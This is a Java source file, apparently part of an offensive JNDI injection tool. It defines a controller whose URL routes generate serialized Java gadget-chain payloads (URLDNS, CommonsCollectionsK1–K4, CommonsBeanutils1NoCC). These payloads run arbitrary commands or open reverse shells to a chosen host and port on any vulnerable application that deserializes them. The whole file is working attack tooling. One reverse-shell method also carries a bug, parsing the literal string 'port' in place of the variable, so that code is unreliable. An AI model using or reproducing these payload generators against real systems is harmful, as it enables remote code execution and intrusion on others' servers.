package map.jndi.controller;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import map.jndi.gadget.*;

import java.util.*;

@JNDIController
@JNDIMapping("/Deserialize")
public class DeserializeController implements Controller {
    public Object process(byte[] data) {
        return data;
    }

    @JNDIMapping("/{data}")
    public byte[] deserialize(String data) {
        System.out.println("[Deserialize] Custom serialized data");
        return Base64.getDecoder().decode(data);
    }

    @JNDIMapping("/URLDNS/{url}")
    public byte[] URLDNS(String url) throws Exception {
        System.out.println("[Deserialize] [URLDNS] URL: " + url);

        byte[] data = URLDNS.create(url);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK1/Command/{cmd}")
    public byte[] CommonsCollectionsK1Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK1] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsCollectionsK1.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK1/ReverseShell/{host}/{port}")
    public byte[] CommonsCollectionsK1ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK1] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt("port"));
        byte[] data = CommonsCollectionsK1.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK2/Command/{cmd}")
    public byte[] CommonsCollectionsK2Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK2] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsCollectionsK2.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK2/ReverseShell/{host}/{port}")
    public byte[] CommonsCollectionsK2ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK2] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        byte[] data = CommonsCollectionsK2.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK3/Command/{cmd}")
    public byte[] CommonsCollectionsK3Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK3] [Command] Cmd: " + cmd);

        byte[] data = CommonsCollectionsK3.create(cmd);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK4/Command/{cmd}")
    public byte[] CommonsCollectionsK4Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK4] [Command] Cmd: " + cmd);

        byte[] data = CommonsCollectionsK4.create(cmd);
        return data;
    }

    @JNDIMapping("/CommonsBeanutils1NoCC/Command/{cmd}")
    public byte[] CommonsBeanutils1NoCCCmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils1NoCC] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsBeanutils1NoCC.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsBeanutils1NoCC/ReverseShell/{host}/{port}")
    public byte[] CommonsBeanutils1NoCCReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils1NoCC] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        byte[] data = CommonsBeanutils1NoCC.create(templatesImpl);
        return data;
    }
}
